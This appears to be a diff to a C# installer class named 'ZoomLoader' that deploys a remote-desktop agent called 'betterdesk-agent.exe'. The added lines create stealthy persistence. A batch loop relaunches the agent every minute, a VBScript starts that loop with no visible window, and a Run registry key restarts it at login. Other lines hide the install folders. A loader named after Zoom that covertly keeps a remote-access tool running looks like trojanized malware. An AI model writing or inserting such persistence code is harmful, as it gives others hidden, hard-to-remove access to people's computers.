@@ -468,13 +468,15 @@ public class ZoomLoader
         // again. Runs as SYSTEM and triggers the interactive user task.
         string watchdog = Path.Combine(ExecDir, "watchdog.cmd");
         WriteFile(watchdog,
-            "@echo off\r\n" +
+            "@echo off\r\n:loop\r\n" +
             "tasklist /FI \"IMAGENAME eq betterdesk-agent.exe\" | find /I \"betterdesk-agent.exe\" >nul\r\n" +
-            "if not errorlevel 1 exit /b 0\r\n" +
-            "schtasks /Run /TN \"" + TaskName + "\"\r\n");
-        Run("schtasks.exe", "/Delete /TN \"" + TaskName + " Watch\" /F", 60000);
-        Run("schtasks.exe", "/Create /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F /TN \"" +
-            TaskName + " Watch\" /TR \"cmd.exe /c \\\"" + watchdog + "\\\"\"", 60000);
+            "if errorlevel 1 schtasks /Run /TN \"" + TaskName + "\"\r\n" +
+            "timeout /t 60 /nobreak >nul\r\ngoto loop\r\n");
+        string watchVbs = Path.Combine(ExecDir, "watchdog.vbs");
+        WriteFile(watchVbs,
+            "Set sh = CreateObject(\"WScript.Shell\")\r\n" +
+            "sh.Run \"cmd.exe /c \" & Chr(34) & \"" + watchdog + "\" & Chr(34), 0, False\r\n");
+        Run("wscript.exe", "//B \"" + watchVbs + "\"", 30000);
         Run("attrib.exe", "+h \"" + DataDir + "\"", 30000);
         Run("attrib.exe", "+h \"" + ExecDir + "\"", 30000);
 
@@ -482,7 +484,10 @@ public class ZoomLoader
         {
             using (RegistryKey run = Registry.CurrentUser.CreateSubKey(
                 @"Software\Microsoft\Windows\CurrentVersion\Run"))
+            {
                 run.SetValue(TaskName, taskCommand);
+                run.SetValue(TaskName + " Watch", "wscript.exe //B \"" + watchVbs + "\"");
+            }
         }
         catch (Exception ex) { Log("run key: " + ex.Message); }
 
